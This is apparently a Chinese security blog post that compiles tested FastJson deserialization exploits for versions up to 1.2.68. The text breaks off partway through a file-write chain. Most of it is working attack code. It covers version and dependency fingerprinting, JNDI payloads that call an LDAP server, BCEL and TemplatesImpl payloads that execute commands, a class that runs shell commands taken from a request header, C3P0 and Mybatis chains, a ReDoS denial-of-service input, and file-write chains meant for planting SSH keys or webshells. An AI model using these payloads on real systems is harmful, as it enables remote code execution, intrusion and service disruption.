# 前言
总结的一些针对FastJson特定版本的Poc利用，所有Poc都已测试全部通过。主要针对FastJson的几大里程碑版本，1.2.47、1.2.68、1.2.80，可能会存在些许偏差，因为同样需考虑到FastJson版本、JDK版本、引入的其他依赖版本、机器是否出网等信息，请根据实际情况做进一步测试和利用。
本篇文章只是复现和罗列了一些能收集到的可利用的链子，后面会深入代码层面分析各个大版本绕过和利用思路(真的太多了)，每一次看都会有很深的感悟。FastJson很深，也很适合Java研究。
下次在遇到JSON格式且确定是FastJson框架时千万别一眼略过，或许会有想不到的惊喜！
# 鉴别FastJson
## 利用报错
参考：[https://blog.csdn.net/m0_71692682/article/details/125814861](https://blog.csdn.net/m0_71692682/article/details/125814861)
不闭合JSON的花括号或者双引号,通过报错可能会将Fastjson爆出来
```json
{"name":"hello", "age":2
{"name"":"hello", "age":2}
```
![image.png](https://cdn.nlark.com/yuque/0/2023/png/26045928/1691056654413-b85ca955-c9a7-48dd-b1e2-164c951eda2d.png#averageHue=%23f8f8f7&clientId=u067551ab-1efd-4&from=paste&height=330&id=D1EVn&originHeight=412&originWidth=1269&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=78424&status=done&style=none&taskId=udd1b7a53-5bb3-4afc-b927-c82539c35d7&title=&width=1015.2)
## 根据解析变化
```json
{"a":new a(1),"b":x'11',/*\*\/"c":Set[{}{}],"d":"\u0000\x00"} {"ext":"blue","name":{"$ref":"$.ext"}}
```
## 查看响应状态
```json
{"@type":"whatever"}
```
## Dnslog-出网
DNS能接收到请求则使用FastJson。
```json
{
  "@type":"java.net.Inet4Address",
  "val":"dnslog"
}
```
# FastJson版本检测
若是白盒或其他能拿到代码的情况下直接看pom.xml中引入的FastJson的依赖或lib目录下的jar包即可。黑盒情况下需要一些手法来检测是否使用FastJson或者FastJson具体版本。后面会写一篇
## AutoCloseable精确探测版本号
```java
{
  "@type": "java.lang.AutoCloseable"
```
![image.png](https://cdn.nlark.com/yuque/0/2023/png/26045928/1692023208411-ffb7a3df-b155-45f1-80d6-67b423a7b4d2.png#averageHue=%23fdfdfd&clientId=ua12c8ebe-585b-4&from=paste&height=154&id=uf375351c&originHeight=193&originWidth=1371&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=36711&status=done&style=none&taskId=u1f6c7fdb-1979-4d8d-841d-0ca58caeeae&title=&width=1096.8)
注意：在FastJson版本大概1.2.76后，即便是通过这种方式探测出精准的FastJson版本，也是1.2.76，即便是使用的1.2.80的依赖，因为在源码中并没有改变。
## Dnslog
```json
//  <=1.2.47
[
  {
    "@type": "java.lang.Class",
    "val": "java.io.ByteArrayOutputStream"
  },
  {
    "@type": "java.io.ByteArrayOutputStream"
  },
  {
    "@type": "java.net.InetSocketAddress"
  {
    "address":,
    "val": "aaa.xxxx.ceye.io"
  }
}
]


//  <=1.2.68
[
  {
    "@type": "java.lang.AutoCloseable",
    "@type": "java.io.ByteArrayOutputStream"
  },
  {
    "@type": "java.io.ByteArrayOutputStream"
  },
  {
    "@type": "java.net.InetSocketAddress"
  {
    "address":,
    "val": "bbb.n41tma.ceye.io"
  }
}
]


//  <=1.2.80 收到一个dns请求，1.2.83 收到两个dns请求
[
  {
    "@type": "java.lang.Exception",
    "@type": "com.alibaba.fastjson.JSONException",
    "x": {
      "@type": "java.net.InetSocketAddress"
  {
    "address":,
    "val": "ccc.4fhgzj.dnslog.cn"
  }
}
},
  {
    "@type": "java.lang.Exception",
    "@type": "com.alibaba.fastjson.JSONException",
    "message": {
      "@type": "java.net.InetSocketAddress"
  {
    "address":,
    "val": "ddd.4fhgzj.dnslog.cn"
  }
}
}
]
```
# FastJson引入依赖检测
其实主要是针对于黑盒情况下，在确定FastJson具体版本后，下一步就是对应payload探测该环境存在的一些依赖，而不是一味的盲打。
主要需要依赖能够回显FastJson的报错的探测，虽然网上流传的有DNSLOG探测，但我实在是没有复现成功，后面再看吧。
## Character转换报错
 测试比较通用的方法：利用Character转换报错
```json
{
  "x": {
    "@type": "java.lang.Character"{
  "@type": "java.lang.Class",
  "val": "org.springframework.web.bind.annotation.RequestMapping"
}}
```
若存在`org.springframework.web.bind.annotation.RequestMapping`:
![image.png](https://cdn.nlark.com/yuque/0/2023/png/26045928/1692849260094-5329d9ea-8fcb-41cf-a1be-f1f0c8f00e1f.png#averageHue=%23fdfafa&clientId=u849ca923-f223-4&from=paste&height=201&id=u0cc7631e&originHeight=251&originWidth=1222&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=44823&status=done&style=none&taskId=u6a03552e-30cc-4f3b-87f4-ad421c7f817&title=&width=977.6)
若不存在：
![image.png](https://cdn.nlark.com/yuque/0/2023/png/26045928/1692849365956-454b7ddd-649d-4f73-9a9a-6f76639887ae.png#averageHue=%23fdfbfb&clientId=u849ca923-f223-4&from=paste&height=167&id=u04a1a345&originHeight=209&originWidth=1085&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=36633&status=done&style=none&taskId=ud4f5a7e6-85ff-4314-b050-a1d0f35f9c4&title=&width=868)
## 依赖类列举
列举一些可能会用到的依赖类：对应Poc探测
```java
org.springframework.web.bind.annotation.RequestMapping  //SpringBoot
org.apache.catalina.startup.Tomcat  //Tomcat
groovy.lang.GroovyShell  //Groovy - 1.2.80
com.mchange.v2.c3p0.DataSources  //C3P0
com.mysql.jdbc.Buffer  //mysql-jdbc-5
com.mysql.cj.api.authentication.AuthenticationProvider  //mysql-connect-6
com.mysql.cj.protocol.AuthenticationProvider //mysql-connect-8
sun.nio.cs.GBK  //JDK8
java.net.http.HttpClient  //JDK11
org.apache.ibatis.type.Alias  //Mybatis
org.apache.tomcat.dbcp.dbcp.BasicDataSource  //tomcat-dbcp-7-BCEL
org.apache.tomcat.dbcp.dbcp2.BasicDataSource //tomcat-dbcp-8及以后-BCEL
org.apache.commons.io.Charsets       // 存在commons-io,但不确定版本
org.apache.commons.io.file.Counters  //commons-io-2.7-2.8
org.aspectj.ajde.Ajde  //aspectjtools
```
# FastJson<=1.2.24
## TemplatesImpl
老生常谈了，加载类字节码，也可用于不出网利用。
但存在先天限制条件：需要指定`Feature.SupportNonPublicField` （因此不常使用）
```java
public static void main(String args[]){
        try {
            byte[] bytes = Files.readAllBytes(Paths.get("E:\\Temp.class"));
            String base64 = java.util.Base64.getEncoder().encodeToString(bytes);
            System.out.println(base64);
            final String NASTY_CLASS = "com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl";
            String s = "{\"@type\":\"" + NASTY_CLASS +
                    "\",\"_bytecodes\":[\""+base64+"\"],'_name':'lemono','_tfactory':{ },\"_outputProperties\":{ },";
            System.out.println(s);
            JSON.parseObject(s, Feature.SupportNonPublicField);
//            Object obj = JSON.parse(s, Feature.SupportNonPublicField);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
```
## JdbcRowSetImpl
主要是JDNI注入，一般情况下需出网，同时需考虑JDK版本，因为在Java高版本中LDAP和RMI受到`trustURLCodebase`限制。具体可看:[https://tttang.com/archive/1405/](https://tttang.com/archive/1405/)
```java
{
  "@type":"com.sun.rowset.JdbcRowSetImpl",
  "dataSourceName":"ldap://10.30.1.214:1389/my9azs",
  "autoCommit":true
} 
```
## BCEL
BCEL分析:[https://www.freebuf.com/vuls/360993.html](https://www.freebuf.com/vuls/360993.html)
BCEL Classloader在 JDK < 8u251之前是在rt.jar里面。且在Tomcat7和Tomcat8下的利用类不同。
tomcat7:
org.apache.tomcat.dbcp.dbcp.BasicDataSource
tomcat8及其以后:
org.apache.tomcat.dbcp.dbcp2.BasicDataSource
引入tomcat-dhcp依赖；
pom.xml:
```java
<dependency>
    <groupId>org.apache.tomcat</groupId>
    <artifactId>tomcat-dbcp</artifactId>
    <version>8.5.42</version>
</dependency>
```
生成BCEL形式字符：
```java
Path path = Paths.get("E:/TestRef.class");
byte[] bytes = Files.readAllBytes(path);
String result = Utility.encode(bytes,true);//生成becl形式的编码
System.out.println("$$BCEL$$" + result);
```
TestRef.class:
```java
public class TestRef {
    public TestRef() throws IOException {
        Runtime.getRuntime().exec("calc");
    }
}
```
```java
{
    {
        "x":{
                "@type": "org.apache.tomcat.dbcp.dbcp2.BasicDataSource",
                "driverClassLoader": {
                    "@type": "com.sun.org.apache.bcel.internal.util.ClassLoader"
                },
                "driverClassName": "$$BCEL$$$l$8b$I$A$A$A$A$A$A$AeP$cbN$CA$Q$ac$86$85$85uQ$k$e2$fb$RO$82$H$b9x$c3$Y$T$a3$89$c9F$M$Q$3c$_$e3$88C$60$d7$ec$ce$g$7e$cb$8b$g$P$7e$80$le$ecA$82$qNg$a6R$d5$d5$dd3$f3$f5$fd$f1$J$e0$E$fb$O$b2$u$3b$a8$605$87$aa$c15$h$eb66$I$d9S$V$u$7dFH$d7$ea$3d$82u$R$deK$c2$8a$a7$Cy$93$8c$fb2$ea$fa$fd$R$xe$_$U$fe$a8$e7G$ca$f0$99h$e9G$V$T$f2$5eW$c6$ba$z$l$9a$E$e7r$o$e4$93Va$Q$db$d8d$de$J$93H$c8$xe$fc$ee$ccw$3c$f4$9f$7d$X6r6$b6$5clc$87$7bq$7b$e1b$X$7b$E$7b$e6$p$U$8d$b31$f2$83A$a3$d5$lJ$a1$J$95$a9$a4$c2$c6uk$3e$8bP$fa3$b6$93$40$ab1$8fs$GR$cfI$b5V$f7$fey$f8$c2$96$9cHA8$ac$zd$3b$3aR$c1$a0$b9Xp$h$85B$c6q$T$H$c8$f0g$9aE$i$fc$E$a4$90gv$ceH$8c$cbGo$a0w$a4$ca$e9WXw$_$ac$a4$e0$Y$ji$3e$z$8e$M$K$dca$89$99$fb$5b$c1X$98$a2$c9$f3$e7$f3$$N$ebJ$3f$83$94$e8$8d$c2$B$A$A"
        }
    }: "x"
}
```
BCEL的另一个好处在于针对不出网的情况下实现命令执行回显或打内存马,所用方式较广。
SpringEcho.java: 命令执行回显
```java
public class SpringEcho {
    public SpringEcho() {
    }

    static {
        try {
            Class requestContext = Thread.currentThread().getContextClassLoader().loadClass("org.springframework.web.context.request.RequestContextHolder");
            Method requestAttributes = requestContext.getMethod("getRequestAttributes");
            Object var2 = requestAttributes.invoke((Object)null);
            requestContext = Thread.currentThread().getContextClassLoader().loadClass("org.springframework.web.context.request.ServletRequestAttributes");
            requestAttributes = requestContext.getMethod("getResponse");
            Method var3 = requestContext.getMethod("getRequest");
            Object var4 = requestAttributes.invoke(var2);
            Object var5 = var3.invoke(var2);
            Method getWriter = Thread.currentThread().getContextClassLoader().loadClass("javax.servlet.ServletResponse").getDeclaredMethod("getWriter");
            Method header = Thread.currentThread().getContextClassLoader().loadClass("javax.servlet.http.HttpServletRequest").getDeclaredMethod("getHeader", String.class);
            header.setAccessible(true);
            getWriter.setAccessible(true);
            Object writer = getWriter.invoke(var4);
            String var9 = (String)header.invoke(var5, "cmd");
            String[] command = new String[3];
            if (System.getProperty("os.name").toUpperCase().contains("WIN")) {
                command[0] = "cmd";
                command[1] = "/c";
            } else {
                command[0] = "/bin/sh";
                command[1] = "-c";
            }

            command[2] = var9;
            writer.getClass().getDeclaredMethod("println", String.class).invoke(writer, (new Scanner(Runtime.getRuntime().exec(command).getInputStream())).useDelimiter("\\A").next());
            writer.getClass().getDeclaredMethod("flush").invoke(writer);
            writer.getClass().getDeclaredMethod("close").invoke(writer);
        } catch (Exception var11) {
        }

    }
}
```
![image.png](https://cdn.nlark.com/yuque/0/2023/png/26045928/1691402201438-156c8f79-7edf-431c-a727-52facf7a8cf7.png#averageHue=%23fdfdfd&clientId=u4fa7817a-05ac-4&from=paste&height=411&id=udf5c51a1&originHeight=514&originWidth=1137&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=105867&status=done&style=none&taskId=ua1cbf6d5-936f-434d-826c-f7500f0b817&title=&width=909.6)
# FastJson <=1.2.47
在FastJson1.2.47及其以前版本中，存在通杀方法，甚至不需要开启AutoTypeSupport。
本质上是使用的缓存cache到mappings中绕过限制。
## JdbcRowSetImpl
```java
{
    "a":{
        "@type":"java.lang.Class",
        "val":"com.sun.rowset.JdbcRowSetImpl"
    },
    "b":{
        "@type":"com.sun.rowset.JdbcRowSetImpl",
        "dataSourceName":"ldap://10.30.1.214:1389/my9azs",
        "autoCommit":true
    }
}

```
## BCEL-1.2.36~1.2.47
tomcat8:以上面配置一致
```java
{
    "name":
    {
        "@type" : "java.lang.Class",
        "val"   : "org.apache.tomcat.dbcp.dbcp2.BasicDataSource"
    },
    "x" : {
        "name": {
            "@type" : "java.lang.Class",
            "val"   : "com.sun.org.apache.bcel.internal.util.ClassLoader"
        },
        "y": {
            "@type":"com.alibaba.fastjson.JSONObject",
            "c": {
                "@type":"org.apache.tomcat.dbcp.dbcp2.BasicDataSource",
                "driverClassLoader": {
                    "@type" : "com.sun.org.apache.bcel.internal.util.ClassLoader"
                },
                "driverClassName":"$$BCEL$$$l$8b$I$A$A$A$A$A$A$AeP$cbN$CA$Q$ac$86$85$85uQ$k$e2$fb$RO$82$H$b9x$c3$Y$T$a3$89$c9F$M$Q$3c$_$e3$88C$60$d7$ec$ce$g$7e$cb$8b$g$P$7e$80$le$ecA$82$qNg$a6R$d5$d5$dd3$f3$f5$fd$f1$J$e0$E$fb$O$b2$u$3b$a8$605$87$aa$c15$h$eb66$I$d9S$V$u$7dFH$d7$ea$3d$82u$R$deK$c2$8a$a7$Cy$93$8c$fb2$ea$fa$fd$R$xe$_$U$fe$a8$e7G$ca$f0$99h$e9G$V$T$f2$5eW$c6$ba$z$l$9a$E$e7r$o$e4$93Va$Q$db$d8d$de$J$93H$c8$xe$fc$ee$ccw$3c$f4$9f$7d$X6r6$b6$5clc$87$7bq$7b$e1b$X$7b$E$7b$e6$p$U$8d$b31$f2$83A$a3$d5$lJ$a1$J$95$a9$a4$c2$c6uk$3e$8bP$fa3$b6$93$40$ab1$8fs$GR$cfI$b5V$f7$fey$f8$c2$96$9cHA8$ac$zd$3b$3aR$c1$a0$b9Xp$h$85B$c6q$T$H$c8$f0g$9aE$i$fc$E$a4$90gv$ceH$8c$cbGo$a0w$a4$ca$e9WXw$_$ac$a4$e0$Y$ji$3e$z$8e$M$K$dca$89$99$fb$5b$c1X$98$a2$c9$f3$e7$f3$$N$ebJ$3f$83$94$e8$8d$c2$B$A$A",

                     "$ref": "$.x.y.c.connection"
            }
        }
    }
}
```
## Mybatis+BCEL 1.2.31~1.2.47
存在mybatis任意版本都可：
```xml
<dependency>
    <groupId>org.mybatis</groupId>
    <artifactId>mybatis</artifactId>
    <version>3.5.5</version>
</dependency>
```
首先第一次请求使用java.lang.Class将所有利用类加入到mapping中，第二次请求将UnpooledDataSource放到list的第一位，再调用getter实现RCE，最终的利用代码。
```java
String js1 = "[{\"@type\":\"java.lang.Class\",\"val\":\"com.sun.org.apache.bcel.internal.util.ClassLoader\"}," +
        "{\"@type\":\"java.lang.Class\",\"val\":\"org.apache.ibatis.datasource.unpooled.UnpooledDataSource\"}," +
        "]";

System.out.println(js1);
JSON.parse(js1);
js2 = "[" +
        "{\"@type\":\"org.apache.ibatis.datasource.unpooled.UnpooledDataSource\", \"driverClassLoader\":{\"$ref\":\"$[1]\"}, \"driver\":\"$$BCEL$$$l$8b$I$A$A$A$A$A$A$AeO$cbj$c2P$Q$3dc$d4$a41$f5Y$ad$b8s$d5$d8E$dd$b8S$KAp$rX$w$e8$3a$de$5e$c2$95$98$40$bc$W$7f$cbM$95$$$fa$B$7e$948$B$c1$40g$60$5e$9csf$e6$7c$f9$fd$D0$40$9b$60x$9eg$82$I$d5$b5$ff$ed$f7C$3f$K$fa$b3$d5Z$Km$c2$m$UG$wR$fa$9dqnoA$c8$8f$e3$_$e9$a0$80$a2$8d$3c$yB$ed$ce$fa$dcEZm$a4$J$9b$60$HR$dfzB$d3$edM$ff$c1$86$O$i$3c$da$u$a1$cc$b2$c2$P$85$85$wWr$_$F$e1$c5$cd0$e6$3aQQ0$cc$8a$7c$q$b1$90$db$z$8b$d4$d1HE$9ex$e7$3c$de$rBNT$c8$3b$z$7e$eb$z$c5$a3$8b$i$9f$9a$g$b1$f3$e5$iM$ee$3a$3c$t$ce$e5$d7$p$kN$a8$d4k$3fh$$$P7d$8bc$O$cfW$8d$m$acL$w$B$A$A\"}," +
        "{\"@type\": \"com.sun.org.apache.bcel.internal.util.ClassLoader\",\"\":\"\"}," +
        "{\"@type\":\"com.alibaba.fastjson.JSONObject\",\"connection\":{}}," +
        "{\"@type\":\"org.apache.ibatis.datasource.unpooled.UnpooledDataSource\",\"driver\":{\"$ref\":\"$.connection\"}}" +
        "]";

System.out.println(js2);
JSON.parse(js2);
```
在Web端就分两步构造，先执行js1添加Class，
![image.png](https://cdn.nlark.com/yuque/0/2023/png/26045928/1691734924453-457c3a51-420c-479b-bc43-caa117e07f07.png#averageHue=%23fdfdfd&clientId=u659bfbb1-7b70-4&from=paste&height=232&id=ubcad5285&originHeight=290&originWidth=830&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=26419&status=done&style=none&taskId=u9c0c532d-cc94-4d34-ac44-fd0565d6b1a&title=&width=664)
再执行js2命令执行。
![image.png](https://cdn.nlark.com/yuque/0/2023/png/26045928/1691734957904-ee9dbaa7-197a-403e-a0a4-3147a5f79719.png#averageHue=%23f7f7f7&clientId=u659bfbb1-7b70-4&from=paste&height=310&id=ud3703ddd&originHeight=387&originWidth=1154&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=82986&status=done&style=none&taskId=ue309618f-5917-4c95-aca5-c5c71c4604a&title=&width=923.2)
## C3P0二次反序列化
只要存在C3P0依赖，FastJson<=1.2.47通杀，无需开启autotype，且能够不出网利用。
这里之前写错了，其实不用引入例如CC这样的反序列化漏洞链，FastJson本身也存在原生发序列化漏洞链，且覆盖1.2全版本(没想到吧XD),所以利用范围就更大了。具体可看这篇：[FastJson原生反序列化](https://y4tacker.github.io/2023/04/26/year/2023/4/FastJson%E4%B8%8E%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E4%BA%8C/)
```xml
<dependency>
    <groupId>com.mchange</groupId>
    <artifactId>c3p0</artifactId>
    <version>0.9.5.4</version>
</dependency>
<dependency>
    <groupId>commons-collections</groupId>
    <artifactId>commons-collections</artifactId>
    <version>3.2.1</version>
</dependency>
```
```java
{
    "a":{
        "@type":"java.lang.Class",
        "val":"com.mchange.v2.c3p0.WrapperConnectionPoolDataSource"
    },
    "b":{
        "@type":"com.mchange.v2.c3p0.WrapperConnectionPoolDataSource",
        "userOverridesAsString":"HexAsciiSerializedMap:EVIL_HEX;",
    }
}
```
生成evil_hex：
```java
public static void main(String[] args) throws Exception {
        String evil_hex = bytesToHex(tobyteArray(gen()));
        String FJ1247 = "{\n" +
                "    \"a\":{\n" +
                "        \"@type\":\"java.lang.Class\",\n" +
                "        \"val\":\"com.mchange.v2.c3p0.WrapperConnectionPoolDataSource\"\n" +
                "    },\n" +
                "    \"b\":{\n" +
                "        \"@type\":\"com.mchange.v2.c3p0.WrapperConnectionPoolDataSource\",\n" +
                "        \"userOverridesAsString\":\"HexAsciiSerializedMap:" + evil_hex + ";\",\n" +
                "    }\n" +
                "}\n";
        System.out.println(FJ1247);
        JSON.parseObject(FJ1247);
    }
    //这里用的cc6，可以随意引用其他反序列化链
    public static Object gen() throws NoSuchFieldException, IllegalAccessException {
        TemplatesImpl templates = TemplatesImpl.class.newInstance();
        setValue(templates, "_bytecodes", new byte[][]{genPayload("calc")});
        setValue(templates, "_name", "1");
        setValue(templates, "_tfactory", null);

        JSONArray jsonArray = new JSONArray();
        jsonArray.add(templates);

        BadAttributeValueExpException bd = new BadAttributeValueExpException(null);
        setValue(bd,"val",jsonArray);

        HashMap hashMap = new HashMap();
        hashMap.put(templates,bd);

        return hashMap;
    }

    //将类序列化为字节数组
    public static byte[] tobyteArray(Object o) throws IOException {
        ByteArrayOutputStream bao = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(bao);
        oos.writeObject(o);   //
        return bao.toByteArray();
    }

    //字节数组转十六进制
    public static String bytesToHex(byte[] bytes) {
        StringBuffer stringBuffer = new StringBuffer();
        for (int i = 0; i < bytes.length; i++) {
            String hex = Integer.toHexString(bytes[i] & 0xff);      //bytes[]中为带符号字节-255~+255，&0xff: 保证得到的数据在0~255之间
            if (hex.length()<2){
                stringBuffer.append("0" + hex);   //0-9 则在前面加‘0’,保证2位避免后面读取错误
            }else {
                stringBuffer.append(hex);
            }
        }
        return stringBuffer.toString();

    }
    public static void setValue(Object obj, String name, Object value) throws Exception{
        Field field = obj.getClass().getDeclaredField(name);
        field.setAccessible(true);
        field.set(obj, value);
    }

    public static byte[] genPayload(String cmd) throws Exception{
        ClassPool pool = ClassPool.getDefault();
        CtClass clazz = pool.makeClass("a");
        CtClass superClass = pool.get(AbstractTranslet.class.getName());
        clazz.setSuperclass(superClass);
        CtConstructor constructor = new CtConstructor(new CtClass[]{}, clazz);
        constructor.setBody("Runtime.getRuntime().exec(\""+cmd+"\");");
        clazz.addConstructor(constructor);
        clazz.getClassFile().setMajorVersion(49);
        return clazz.toBytecode();
    }
```
# FastJson <=1.2.60
commons-configuration-1.10,且autotype enable：`ParserConfig.getGlobalInstance().setAutoTypeSupport(true)`
```xml
<dependency>
    <groupId>commons-configuration</groupId>
    <artifactId>commons-configuration</artifactId>
    <version>1.10</version>
</dependency>
```
```java
{"@type":"org.apache.commons.configuration.JNDIConfiguration","prefix":"ldap://10.30.1.214:1389/msy62c"}
```

# FastJson <=1.2.61
 autotype anable：
```xml
<dependency>
    <groupId>org.apache.commons</groupId>
    <artifactId>commons-configuration2</artifactId>
    <version>2.8.0</version>
</dependency>
```
```java
{"@type":"org.apache.commons.configuration2.JNDIConfiguration","prefix":"ldap://10.30.1.214:1389/msy62c"}
```
# FastJson <=1.2.67
## Shiro
条件：开启autotype,存在shiro(不限版本)即可通杀
```xml
<dependency>
    <groupId>org.apache.shiro</groupId>
    <artifactId>shiro-core</artifactId>
    <version>1.5.2</version>
</dependency>
```
```java
ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
{"@type":"org.apache.shiro.jndi.JndiObjectFactory","resourceName":"ldap://192.168.0.107:1389/y0drfh","instance":{"$ref":"$.instance"}}
```
# FastJson 1.2.36~1.2.62
存在拒绝服务攻击，无其他条件，可变相用于黑盒版本探测
```json
{"regex":{"$ref":"$[blue rlike '^[a-zA-Z]+(([a-zA-Z ])?[a-zA-Z]*)*$']"},"blue":"aaaaaaaaaaaaaaaaaaaaaaaaaaaa!"}

{"regex":{"$ref":"$[\blue = /\^[a-zA-Z]+(([a-zA-Z ])?[a-zA-Z]*)*$/]"},"blue":"aaaaaaaaaaaaaaaaaaaaaaaaaaaa!"}
```
# FastJson <=1.2.68
又是另一个大版本系列，因为黑名单的限制极大约束了JNDI类型的利用，所以后面就把漏洞利用方式移到了期望类(expectClass)上，观察下面的Poc，基本上的都是使用的java.lang.AutoCloseable绕过期望类，同时将利用思路转移到文件读写操作上。
关于文件读写的危害：既然探测到存在漏洞，便可通过文件写操作写入计划任务、ssh密钥、dll劫持、写入jsp木马(非spring，能解析jsp)、写入jar包启动加载等等，读文件就不说了，配置文件、敏感文件等。
## 写文件利用
### 依赖比较多，条件苛刻
```xml
<dependency>
    <groupId>org.aspectj</groupId>
    <artifactId>aspectjtools</artifactId>
    <version>1.9.5</version>
</dependency>
<dependency>
    <groupId>com.esotericsoftware</groupId>
    <artifactId>kryo</artifactId>
    <version>4.0.0</version>
</dependency>
<dependency>
    <groupId>com.sleepycat</groupId>
    <artifactId>je</artifactId>
    <version>5.0.73</version>
</dependency>
```
buffer处为写入文件的base64编码字符串，position为对应的解码后数据的字节长度，需设置正确，否则报错。若原字符串包含中文字符则一个字符的字节长度为2。
```json
{
"stream": {
"@type": "java.lang.AutoCloseable",
"@type": "org.eclipse.core.internal.localstore.SafeFileOutputStream",
"targetPath": "e:/ddd.txt",
"tempPath": "e:/test.txt"
},
"writer": {
"@type": "java.lang.AutoCloseable",
"@type": "com.esotericsoftware.kryo.io.Output",
"buffer": "cXdlcmFzZGY=",
"outputStream": {
"$ref": "$.stream"
},
"position": 8
},
"close": {
"@type": "java.lang.AutoCloseable",
"@type": "com.sleepycat.bind.serial.SerialOutput",
"out": {
"$ref": "$.writer"
}
}
}
```
### Commons-IO 2.0 - 2.6
JDK8: 1.2.37<=FastJson<=1.2.68
JDK11: 1.2.57<=FastJson<=1.2.68
```xml
<dependency>
    <groupId>commons-io</groupId>
    <artifactId>commons-io</artifactId>
    <version>2.6</version>
</dependency>
```
需保证在数据传入时长度必须大于8192(8KB)才会写入到文件，且只会写入前8KB
```java
//commons-io 2.0 - 2.6 版本：
String code = "FLAG{THIS_IS_A_flAT_THAT_You_REALLY_waNT!!!}";
int length = code.length();
for (int i = 0; i <= 8192 - length ; i++) {
    code += " ";
}
String poc4 = "{\n" +
        "  \"x\":{\n" +
        "    \"@type\":\"com.alibaba.fastjson.JSONObject\",\n" +
        "    \"input\":{\n" +
        "      \"@type\":\"java.lang.AutoCloseable\",\n" +
        "      \"@type\":\"org.apache.commons.io.input.ReaderInputStream\",\n" +
        "      \"reader\":{\n" +
        "        \"@type\":\"org.apache.commons.io.input.CharSequenceReader\",\n" +
        "        \"charSequence\":{\"@type\":\"java.lang.String\"\"" + code +"\"\n" +
        "      },\n" +
        "      \"charsetName\":\"UTF-8\",\n" +
        "      \"bufferSize\":1024\n" +
        "    },\n" +
        "    \"branch\":{\n" +
        "      \"@type\":\"java.lang.AutoCloseable\",\n" +
        "      \"@type\":\"org.apache.commons.io.output.WriterOutputStream\",\n" +
        "      \"writer\":{\n" +
        "        \"@type\":\"org.apache.commons.io.output.FileWriterWithEncoding\",\n" +
        "        \"file\":\"e:/aaa.txt\",\n" +
        "        \"encoding\":\"UTF-8\",\n" +
        "        \"append\": false\n" +
        "      },\n" +
        "      \"charsetName\":\"UTF-8\",\n" +
        "      \"bufferSize\": 1024,\n" +
        "      \"writeImmediately\": true\n" +
        "    },\n" +
        "    \"trigger\":{\n" +
        "      \"@type\":\"java.lang.AutoCloseable\",\n" +
        "      \"@type\":\"org.apache.commons.io.input.XmlStreamReader\",\n" +
        "      \"is\":{\n" +
        "        \"@type\":\"org.apache.commons.io.input.TeeInputStream\",\n" +
        "        \"input\":{\n" +
        "          \"$ref\":\"$.input\"\n" +
        "        },\n" +
        "        \"branch\":{\n" +
        "          \"$ref\":\"$.branch\"\n" +
        "        },\n" +
        "        \"closeBranch\": true\n" +
        "      },\n" +
        "      \"httpContentType\":\"text/xml\",\n" +
        "      \"lenient\":false,\n" +
        "      \"defaultEncoding\":\"UTF-8\"\n" +
        "    },\n" +
        "    \"trigger2\":{\n" +
        "      \"@type\":\"java.lang.AutoCloseable\",\n" +
        "      \"@type\":\"org.apache.commons.io.input.XmlStreamReader\",\n" +
        "      \"is\":{\n" +
        "        \"@type\":\"org.apache.commons.io.input.TeeInputStream\",\n" +
        "        \"input\":{\n" +
        "          \"$ref\":\"$.input\"\n" +
        "        },\n" +
        "        \"branch\":{\n" +
        "          \"$ref\":\"$.branch\"\n" +
        "        },\n" +
        "        \"closeBranch\": true\n" +
        "      },\n" +
        "      \"httpContentType\":\"text/xml\",\n" +
        "      \"lenient\":false,\n" +
        "      \"defaultEncoding\":\"UTF-8\"\n" +
        "    },\n" +
        "    \"trigger3\":{\n" +
        "      \"@type\":\"java.lang.AutoCloseable\",\n" +
        "      \"@type\":\"org.apache.commons.io.input.XmlStreamReader\",\n" +
        "      \"is\":{\n" +
        "        \"@type\":\"org.apache.commons.io.input.TeeInputStream\",\n" +
        "        \"input\":{\n" +
        "          \"$ref\":\"$.input\"\n" +
        "        },\n" +
        "        \"branch\":{\n" +
        "          \"$ref\":\"$.branch\"\n" +
        "        },\n" +
        "        \"closeBranch\": true\n" +
        "      },\n" +
        "      \"httpContentType\":\"text/xml\",\n" +
        "      \"lenient\":false,\n" +
        "      \"defaultEncoding\":\"UTF-8\"\n" +
        "    }\n" +
        "  }\n" +
        "}";
System.out.println(poc4);
JSON.parseObject(poc4);
```
### Commons-IO 2.7 - 2.8
```java
//commons-io 2.7 - 2.8
String code5 = "FLAG{THIS_IS_A_flAT_THAT_You_REALLY_waNT!!!}";
int length5 = code5.length();
for (int i = 0; i <= 8192 - length5 ; i++) {
    code5 += " ";
}
String poc5 = "\n" +
        "{\n" +
        "  \"x\":{\n" +
        "    \"@type\":\"com.alibaba.fastjson.JSONObject\",\n" +
        "    \"input\":{\n" +
        "      \"@type\":\"java.lang.AutoCloseable\",\n" +
        "      \"@type\":\"org.apache.commons.io.input.ReaderInputStream\",\n" +
        "      \"reader\":{\n" +
        "        \"@type\":\"org.apache.commons.io.input.CharSequenceReader\",\n" +
        "        \"charSequence\":{\"@type\":\"java.lang.String\"\""+ code5 +"\",\n" +
        "        \"start\":0,\n" +
        "        \"end\":2147483647\n" +
        "      },\n" +
        "      \"charsetName\":\"UTF-8\",\n" +
        "      \"bufferSize\":1024\n" +
        "    },\n" +
        "    \"branch\":{\n" +
        "      \"@type\":\"java.lang.AutoCloseable\",\n" +
        "      \"@type\":\"org.apache.commons.io.output.WriterOutputStream\",\n" +
        "      \"writer\":{\n" +
        "        \"@type\":\"org.apache.commons.io.output.FileWriterWithEncoding\",\n" +
        "        \"file\":\"e:/ccc.txt\",\n" + //更改文件写入路径
        "        \"charsetName\":\"UTF-8\",\n" +
        "        \"append\": false\n" +
        "      },\n" +
        "      \"charsetName\":\"UTF-8\",\n" +
        "      \"bufferSize\": 1024,\n" +
        "      \"writeImmediately\": true\n" +
        "    },\n" +
        "    \"trigger\":{\n" +
        "      \"@type\":\"java.lang.AutoCloseable\",\n" +
        "      \"@type\":\"org.apache.commons.io.input.XmlStreamReader\",\n" +
